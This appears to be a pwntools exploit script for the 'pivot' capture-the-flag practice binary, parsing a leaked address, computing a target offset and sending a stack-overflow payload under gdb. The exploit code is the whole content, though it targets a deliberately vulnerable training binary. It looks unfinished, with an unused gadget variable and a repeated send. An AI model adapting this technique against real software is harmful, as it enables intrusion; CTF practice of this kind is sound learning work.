from pwn import*
elf = context.binary = ELF('./pivot', checksec=False)

p = process("./pivot")

gdb.attach(p, gdbscript='''
b*pwnme+113
c
''')
gadget = elf.sym['usefulGadgets']

p.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: 0x")
leak = int(p.recv(12),16)
print("[+]LEAK:", hex(leak))
win = leak + 0x1e2b71

payload = flat(
    cyclic(0x28),
    win
      )
p.sendlineafter(b"> ",payload)
p.sendlineafter(b"> ",payload)
p.interactive()